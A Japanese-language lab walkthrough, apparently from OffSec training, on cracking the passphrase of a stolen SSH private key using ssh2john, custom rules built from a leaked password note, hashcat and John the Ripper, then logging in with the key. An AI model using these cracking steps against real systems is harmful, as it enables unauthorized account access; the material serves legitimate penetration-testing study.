ディレクトリトラバーサルなどにより窃取した秘密鍵を使用する際に必要なパスフレーズのクラック。以下のファイルを入手済みとする。
- note.txt
- id_rsa
```bash
cat note.txt      
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```

準備
```bash
# 権限付与
chmod 600 id_rsa

ssh2john id_rsa > ssh.hash
# 出力後、最初のid_rsa:の部分を削除する

hashcat -h | grep -i "ssh"
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)        | Private Key

# note.txtの内容からルールを作成
cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

note.txtの内容のパスワードの部分を抽出したpasswordsファイルを作成しておく
cat ssh.passwords 
Window
rickc137
dave
superdave
megadave
umbrella
```

クラッキング（失敗例）
```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

# hashcatが対応していない形式
Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
```

クラッキング（成功例）
```bash
cat ssh.rules
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

# ルールファイルの内容を/etc/john/john.confに追加
sudo sh -c 'cat /home/kali/OffSec/passwordattacks/ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash

```

接続
```bash
ssh -i id_rsa -p 2222 dave@192.168.248.201
# passphraseを入力するとログインできる
```
